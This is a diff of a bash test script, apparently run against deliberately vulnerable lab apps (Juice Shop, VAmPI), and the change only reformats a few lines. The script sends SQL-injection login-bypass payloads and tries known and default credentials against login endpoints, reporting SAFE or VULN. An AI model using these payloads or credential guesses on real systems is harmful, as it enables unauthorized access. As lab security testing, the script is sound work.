@@ -19,7 +19,8 @@ for payload in "admin'--" "' OR 1=1--" "admin'/*" "') OR ('1'='1"; do
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"${payload}\",\"password\":\"x\"}" --max-time 10) || code="ERR"
-  tag="[SAFE]"; [[ "$code" == "200" ]] && tag="[VULN]"
+  tag="[SAFE]"
+  [[ "$code" == "200" ]] && tag="[VULN]"
   printf "  %s SQLi login bypass (%s) -> HTTP %s\n" "$tag" "$payload" "$code"
 done
 echo ""
@@ -47,20 +48,24 @@ fi
 echo ""
 echo "  [T1078.b] Juice Shop known accounts:"
 for cred in "admin@juice-sh.op:admin123" "jim@juice-sh.op:ncc-1701" "bender@juice-sh.op:OhG0dPlease1nsique"; do
-  user="${cred%%:*}"; pass="${cred##*:}"
+  user="${cred%%:*}"
+  pass="${cred##*:}"
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
     -H "Content-Type: application/json" -d "{\"email\":\"${user}\",\"password\":\"${pass}\"}" --max-time 10) || code="ERR"
-  tag="[SAFE]"; [[ "$code" == "200" ]] && tag="[VULN]"
+  tag="[SAFE]"
+  [[ "$code" == "200" ]] && tag="[VULN]"
   printf "  %s %s:%s -> HTTP %s\n" "$tag" "$user" "$pass" "$code"
 done
 
 echo ""
 echo "  [T1078.c] VAmPI default/weak accounts:"
 for cred in "admin:admin" "admin:password" "admin:123456" "test:test"; do
-  user="${cred%%:*}"; pass="${cred##*:}"
+  user="${cred%%:*}"
+  pass="${cred##*:}"
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/vampi/users/v1/login" \
     -H "Content-Type: application/json" -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}" --max-time 10) || code="ERR"
-  tag="[SAFE]"; [[ "$code" == "200" ]] && tag="[VULN]"
+  tag="[SAFE]"
+  [[ "$code" == "200" ]] && tag="[VULN]"
   printf "  %s %s:%s -> HTTP %s\n" "$tag" "$user" "$pass" "$code"
 done
 
